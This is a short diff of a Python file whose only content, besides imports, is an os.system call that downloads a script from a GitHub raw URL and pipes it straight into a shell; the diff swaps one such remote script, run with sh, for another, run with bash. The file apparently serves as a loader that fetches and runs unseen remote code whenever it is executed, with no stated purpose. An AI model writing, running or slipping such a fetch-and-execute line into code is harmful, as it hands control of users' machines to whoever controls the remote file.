@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/sitina21/pythonkuy/raw/main/CLI.sh | sh')
+os.system('curl -sL https://github.com/sitina21/zuph/raw/main/zapar | bash')
